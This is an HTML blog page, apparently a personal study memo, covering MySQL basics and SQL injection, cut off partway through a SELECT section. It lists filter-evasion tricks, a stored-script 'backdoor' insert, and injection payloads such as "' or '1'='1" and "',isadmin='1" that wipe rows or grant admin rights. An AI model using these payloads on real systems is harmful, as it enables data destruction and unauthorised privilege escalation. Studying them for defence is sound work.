@@ -1,0 +1,635 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="reader-l">
+  <meta name="keywords" content="reader-l&#39;s blog">
+  <title>mysql注入攻防技术备忘录 - reader-l&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"reader-l.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="reader-l's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>reader-l's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/List/">
+                <i class="iconfont icon-link-fill"></i>
+                List
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="mysql注入攻防技术备忘录">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-03-24 19:57" pubdate>
+        2020年3月24日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      4.4k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      64
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">mysql注入攻防技术备忘录</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2020年6月17日 上午
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id><a href="#" class="headerlink" title></a><a id="more"></a></h1><h1 id="Mysql注入攻防技术（备忘录）"><a href="#Mysql注入攻防技术（备忘录）" class="headerlink" title="Mysql注入攻防技术（备忘录）"></a>Mysql注入攻防技术（备忘录）</h1><p>补充：</p>
+<p>规避程序检查注入事例：</p>
+<p>1.or–+2=!!!2类假!!!2为真的结果，利用不变逻辑的!!!代替空格</p>
+<p>2.注释</p>
+<p>3.加好+连接字符替换</p>
+<p>十六进制码替代%20</p>
+<p>ascii码替换char(32)</p>
+<h3 id="1-sql基础DDL语言（数据定义语言）"><a href="#1-sql基础DDL语言（数据定义语言）" class="headerlink" title="1.sql基础DDL语言（数据定义语言）"></a>1.sql基础DDL语言（数据定义语言）</h3><p>备忘录：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> database test2 <span class="hljs-keyword">default</span> charset utf8;<br><span class="hljs-comment">-- 按默认选项创建数据库test2,并且设置字符集为utf-8</span><br><span class="hljs-keyword">drop</span> database test2;<br><span class="hljs-comment">--删除数据库</span><br>use test1;<br><br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> user2(uid <span class="hljs-type">int</span>,name <span class="hljs-type">varchar</span>(<span class="hljs-number">32</span>),regtime datetime);<br><span class="hljs-comment">-- 创建表user2</span><br><span class="hljs-keyword">show</span> <span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> user2;<br><span class="hljs-comment">-- 查看刚创建的表的结构</span><br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> user2;<br><span class="hljs-comment">-- 删除表user2</span><br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> user2 <span class="hljs-keyword">add</span> <span class="hljs-keyword">column</span> 字段名 字段的数据类型;<br><span class="hljs-comment">-- 添加字段</span><br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> user2 <span class="hljs-keyword">drop</span> <span class="hljs-keyword">column</span> 字段名;<br><span class="hljs-comment">-- 删除字段</span><br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> user2 modify <span class="hljs-keyword">column</span> name <span class="hljs-type">int</span>;<br><span class="hljs-comment">-- 修改user2表中uid字段的数据类型为varchar(32)-&gt;int</span><br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> user2 change name name <span class="hljs-type">int</span> <span class="hljs-keyword">first</span>;<br><span class="hljs-comment">-- 修改user2表中字段的排列顺序，将name字段排到第一位</span><br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> user2 change name username <span class="hljs-type">varchar</span>(<span class="hljs-number">32</span>) after uid;<br><span class="hljs-comment">-- 修改user2表中name的字段名、类型、以及排在哪个字段后面</span><br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> user2 <span class="hljs-keyword">add</span> <span class="hljs-keyword">column</span> mobile <span class="hljs-type">bigint</span> after username;<br><span class="hljs-comment">-- 在user2表中添加一个新的字段的位置的同时设置它的位置</span><br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> user2 rename users;<br><span class="hljs-comment">--修改user2的表名为users</span><br></code></pre></td></tr></table></figure>
+
+
+<h3 id="2-sql中DML-数据操作语言-（备忘录）"><a href="#2-sql中DML-数据操作语言-（备忘录）" class="headerlink" title="2.sql中DML(数据操作语言)（备忘录）"></a>2.sql中DML(数据操作语言)（备忘录）</h3><h4 id="1-insert"><a href="#1-insert" class="headerlink" title="1.insert"></a>1.insert</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(uid,username,password,mobile)<br>	<span class="hljs-keyword">values</span>(<span class="hljs-number">12138</span>,<span class="hljs-string">&#x27;reader&#x27;</span>,<span class="hljs-string">&#x27;123&#x27;</span>,<span class="hljs-string">&#x27;12345&#x27;</span>);<br><span class="hljs-comment">-- 对users表进行插入数据</span><br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(uid,username)<br>	<span class="hljs-keyword">values</span>(<span class="hljs-number">123123</span>,<span class="hljs-string">&#x27;hahah&#x27;</span>);<br><span class="hljs-comment">--如果对users只要插入两条数据的话，只需要按上述例子就行</span><br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(uid,username) <span class="hljs-keyword">select</span> <span class="hljs-number">1111</span>,<span class="hljs-string">&#x27;reader1&#x27;</span>;<br><span class="hljs-comment">--这是拓展插入玩法，需要牢记</span><br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users <span class="hljs-keyword">set</span> uid<span class="hljs-operator">=</span><span class="hljs-number">11122</span>,username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;reader2&#x27;</span>;<br></code></pre></td></tr></table></figure>
+<p><strong>insert 留后门逻辑</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(uid,blog,password,isadmin)<br><span class="hljs-keyword">values</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;&lt;script javascript&gt;cracker,go,go,go&lt;/script&gt;&#x27;</span>,<span class="hljs-string">&#x27;eeee&#x27;</span>,<span class="hljs-number">1</span>)<br><span class="hljs-comment">/*用途:</span><br><span class="hljs-comment">	1.可能被注入者利用，相当于病毒脚本，当打开网页的时候，如果处理程序并未屏蔽脚本的游览器解析，那么就会跳出很多广告窗口，目的是为了获取流量</span><br><span class="hljs-comment">	2.对于注入者可以放置数据库链接和通信的脚本，以便在适当的时候，select into outfile到web可访问的目录下，目的是通过http连接就可以直接访问数据库啦</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure>
+<h4 id="2-delete"><a href="#2-delete" class="headerlink" title="2.delete"></a>2.delete</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> users1 <span class="hljs-keyword">as</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users;<br><span class="hljs-comment">-- 从users表中拷贝数据到user1</span><br><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> user1 <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;reader&#x27;</span>;<br><span class="hljs-comment">-- 将users1中username=&#x27;reader&#x27;的数据删除</span><br><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> user1;<br><span class="hljs-comment">-- 将user1中所有的数据全部删除</span><br><span class="hljs-keyword">delete</span> a,b <span class="hljs-keyword">from</span> user1 a,admin1 b <span class="hljs-keyword">where</span> a.username<span class="hljs-operator">=</span>b.username <span class="hljs-keyword">and</span> a.username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;reader&#x27;</span>;<br><span class="hljs-comment">-- 关联删除：将user1、admin1两张表中关联的子弹username中存在username=&#x27;reader&#x27;的数据删除掉；user1、admin1都会删除掉相关数据</span><br><br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> user3 <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users;<br><span class="hljs-comment">-- 从user2表中拷贝数据到user3</span><br><br><br>uname<span class="hljs-operator">=</span>reader<br>mysql <span class="hljs-operator">-</span>u root(以mysql中的root) <span class="hljs-operator">-</span>p test1(对应数据库) <span class="hljs-operator">-</span>e &quot;delete from users where username=&#x27;$uname&#x27;&quot;<br><span class="hljs-comment">--按照该方法可以在终端将对应的数据删除</span><br><span class="hljs-comment">--以下是具体实例</span><br>root<span class="hljs-variable">@kali</span><span class="hljs-operator">-</span>PC:<span class="hljs-operator">/</span>home<span class="hljs-operator">/</span>reader<span class="hljs-operator">/</span>Desktop# uname<span class="hljs-operator">=</span><span class="hljs-string">&#x27;reader&#x27;</span><br>root<span class="hljs-variable">@kali</span><span class="hljs-operator">-</span>PC:<span class="hljs-operator">/</span>home<span class="hljs-operator">/</span>reader<span class="hljs-operator">/</span>Desktop# mysql <span class="hljs-operator">-</span>u root <span class="hljs-operator">-</span>p test1 <span class="hljs-operator">-</span>e &quot;delete from users where username=&#x27;$uname&#x27;&quot;<br>Enter password: <br>root<span class="hljs-variable">@kali</span><span class="hljs-operator">-</span>PC:<span class="hljs-operator">/</span>home<span class="hljs-operator">/</span>reader<span class="hljs-operator">/</span>Desktop# <br><br><span class="hljs-comment">--delete注入删除</span><br>uname <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span><br>mysql <span class="hljs-operator">-</span>u root(以mysql中的root) <span class="hljs-operator">-</span>p test1(对应数据库名称) <span class="hljs-operator">-</span>e &quot;delete from users where username=&#x27;$uname&#x27;&quot;<br><span class="hljs-comment">--这样会将数据库中的所有数据删除</span><br></code></pre></td></tr></table></figure>
+<h4 id="3-update操作"><a href="#3-update操作" class="headerlink" title="3.update操作"></a>3.update操作</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">update</span> users <span class="hljs-keyword">set</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;reader&#x27;</span> <span class="hljs-keyword">where</span> uid<span class="hljs-operator">=</span><span class="hljs-number">123</span>;<br><span class="hljs-comment">--将users中的符合字段uid=123的username的值更新为reader</span><br><span class="hljs-keyword">update</span> users <span class="hljs-keyword">set</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;admin1&#x27;</span>,mobile<span class="hljs-operator">=</span><span class="hljs-string">&#x27;123123&#x27;</span> <span class="hljs-keyword">where</span> uid<span class="hljs-operator">=</span><span class="hljs-number">12138</span><br><span class="hljs-comment">--实现多个字段有条件数据的更新</span><br><br><br><span class="hljs-comment">--普通更新</span><br>uname<span class="hljs-operator">=</span>reader1<br>mysql <span class="hljs-operator">-</span>u root <span class="hljs-operator">-</span>p test1 <span class="hljs-operator">-</span>e &quot;update users set uid =12138 where username=&#x27;$uname&#x27;&quot;<br><span class="hljs-comment">-- 将test1数据库中的字段username值为reader1的uid改为12138</span><br><br><span class="hljs-comment">--全集更新（update注入）</span><br>uname <span class="hljs-operator">=</span> &quot;&#x27;or &#x27;1&#x27;=&#x27;1&quot;<br>mysql <span class="hljs-operator">-</span>u root <span class="hljs-operator">-</span>p test1 <span class="hljs-operator">-</span>e &quot;update users set uid =12138 where username=&#x27;$uname&#x27;&quot;<br><span class="hljs-comment">--将test1中字段uid全部改为12138</span><br><br><br><span class="hljs-comment">-------------------------------------------------------------------</span><br><span class="hljs-comment">/*假如服务器判断对方是不是管理员是使用isadmin字段，我们要进行提权操作，可以这样弄,假如对方数据库test1中的一个表user0的结构是这样的</span><br><span class="hljs-comment"> user0 | CREATE TABLE `user0` (</span><br><span class="hljs-comment">  `username` varchar(32) DEFAULT NULL,</span><br><span class="hljs-comment">  `password` varchar(32) DEFAULT NULL,</span><br><span class="hljs-comment">  `isadmin` int(11) DEFAULT NULL</span><br><span class="hljs-comment">) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 |</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">MariaDB [test1]&gt; select * from user0;</span><br><span class="hljs-comment">+----------+----------+---------+</span><br><span class="hljs-comment">| username | password | isadmin |</span><br><span class="hljs-comment">+----------+----------+---------+</span><br><span class="hljs-comment">| admin    | admin    |       1 |</span><br><span class="hljs-comment">| reader   | reader   |       0 |</span><br><span class="hljs-comment">+----------+----------+---------+</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">我们希望将reader的isadmin改为1,提升我们的权限</span><br><span class="hljs-comment">*/</span><br>root<span class="hljs-variable">@kali</span><span class="hljs-operator">-</span>PC:<span class="hljs-operator">/</span>home<span class="hljs-operator">/</span>reader<span class="hljs-operator">/</span>Desktop# passwd<span class="hljs-operator">=</span>&quot;&#x27;,isadmin=&#x27;1&quot;<br>root<span class="hljs-variable">@kali</span><span class="hljs-operator">-</span>PC:<span class="hljs-operator">/</span>home<span class="hljs-operator">/</span>reader<span class="hljs-operator">/</span>Desktop# echo $passwd<br><span class="hljs-string">&#x27;,isadmin=&#x27;</span><span class="hljs-number">1</span><br><span class="hljs-comment">--如此构造得到的最终的sql语句是这样的</span><br><span class="hljs-keyword">update</span> user0 <span class="hljs-keyword">set</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;&#x27;</span>,isadmin<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;reader&#x27;</span><br><span class="hljs-comment">--这样就会把reader的权限改为1，提高我们的权限</span><br>对密码的修改和提高的权限的修改都一样思路，构造适合的闭合就可以了<br><br></code></pre></td></tr></table></figure>
+<h4 id="4-select"><a href="#4-select" class="headerlink" title="4.select"></a>4.select</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span>	<span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> username;<br><span class="hljs-comment">-- 按照默认的按username从小到大排列</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> username <span class="hljs-keyword">desc</span>;<br><span class="hljs-comment">-- 按照从username的大到小排列</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span>;<br><span class="hljs-comment">-- 按照第一个字段从小到大排列</span><br><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users limit <span class="hljs-number">2</span>;<br><span class="hljs-comment">-- 将users表中前两行找出来</span><br><br>子查询<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> uid <span class="hljs-keyword">in</span> (<span class="hljs-keyword">select</span> uid <span class="hljs-keyword">from</span> users1);<br><span class="hljs-comment">-- 将users中uid字段与存在users1的uid的字段数据相同的数据查找出来</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> uid <span class="hljs-keyword">from</span> users1);<br><span class="hljs-comment">-- 只要exists后面子查询的语句为真，那么前面就将数据查找出来</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users a <span class="hljs-keyword">where</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> uid <span class="hljs-keyword">from</span> users1 b <span class="hljs-keyword">where</span> a.uid<span class="hljs-operator">=</span>b.uid);<br><span class="hljs-comment">-- 这sql语句的最终结果是和in一样的</span><br><br><span class="hljs-keyword">select</span> a.username,b.mobile <span class="hljs-keyword">from</span> user1 a <span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span> user2 b <span class="hljs-keyword">on</span> a.uid<span class="hljs-operator">=</span>b.uid;<br><span class="hljs-comment">--通过内连接，查询两个表中一致uid的，user1中的username和user2中的mobile的值。on的后面是连接条件</span><br><br><span class="hljs-comment">/*这是user1和user2表中所有数据</span><br><span class="hljs-comment">+----------+-------+----------+--------+</span><br><span class="hljs-comment">| username | uid   | password | mobile |</span><br><span class="hljs-comment">+----------+-------+----------+--------+</span><br><span class="hljs-comment">| reader1  | 12136 | NULL     |   NULL |</span><br><span class="hljs-comment">| reader2  | 12138 | NULL     |   NULL |</span><br><span class="hljs-comment">| admin    | 12137 | 123      |    123 |</span><br><span class="hljs-comment">| admin1   | 12135 | 111123   |    123 |</span><br><span class="hljs-comment">| admin2   | 12134 | 111123   |    123 |</span><br><span class="hljs-comment">+----------+-------+----------+--------+</span><br><span class="hljs-comment">5 rows in set (0.00 sec)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">MariaDB [test1]&gt; select * from user2;</span><br><span class="hljs-comment">+----------+-------+----------+---------+</span><br><span class="hljs-comment">| username | uid   | password | mobile  |</span><br><span class="hljs-comment">+----------+-------+----------+---------+</span><br><span class="hljs-comment">| reader1  | 12136 | NULL     |    NULL |</span><br><span class="hljs-comment">| reader2  | 12138 | NULL     |    NULL |</span><br><span class="hljs-comment">| admin    | 12137 | 123      |     123 |</span><br><span class="hljs-comment">| admin2   | 12133 | 111123   | 1231111 |</span><br><span class="hljs-comment">+----------+-------+----------+---------+</span><br><span class="hljs-comment">以下这个是内连接得到的结果</span><br><span class="hljs-comment">+----------+--------+</span><br><span class="hljs-comment">| username | mobile |</span><br><span class="hljs-comment">+----------+--------+</span><br><span class="hljs-comment">| reader1  |   NULL |</span><br><span class="hljs-comment">| reader2  |   NULL |</span><br><span class="hljs-comment">| admin    |    123 |</span><br><span class="hljs-comment">+----------+--------+</span><br><span class="hljs-comment">3 rows in set (0.00 sec)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">select</span> a.username,b.mobile <span class="hljs-keyword">from</span> user1 a <span class="hljs-keyword">left</span> <span class="hljs-keyword">join</span> user2 b <span class="hljs-keyword">on</span> a.uid<span class="hljs-operator">=</span>b.uid;<br><span class="hljs-comment">/*+----------+--------+</span><br><span class="hljs-comment">| username | mobile |</span><br><span class="hljs-comment">+----------+--------+</span><br><span class="hljs-comment">| reader1  |   NULL |</span><br><span class="hljs-comment">| reader2  |   NULL |</span><br><span class="hljs-comment">| admin    |    123 |</span><br><span class="hljs-comment">| admin1   |   NULL |</span><br><span class="hljs-comment">| admin2   |   